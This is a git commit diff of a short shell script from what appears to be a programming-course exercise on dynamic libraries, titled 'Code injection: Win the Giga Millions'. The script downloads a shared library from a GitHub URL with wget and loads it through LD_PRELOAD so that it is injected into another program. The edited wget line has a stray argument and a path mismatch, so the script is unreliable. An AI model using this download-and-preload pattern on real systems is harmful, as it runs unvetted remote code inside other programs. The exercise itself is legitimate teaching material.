4dc30aebcfbd5a49f4e90f0e21a9496a1f0ba2c7
BekaHabesha <bereketdm1984@gmail.com>
2023-11-14 10:15:27 -0800

    101-make_me_win.sh - 3. Code injection: Win the Giga Millions./101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P .. https://raw.github.com/BekaHabesha/alx-low_level_programming/main/0x18-dynamic_libraries/jpot.so
+wget -P .. $PWD/ https://raw.github.com/BekaHabesha/alx-low_level_programming/main/0x18-dynamic_libraries/jpot.so
 export LD_PRELOAD=$PWD/jpot.so
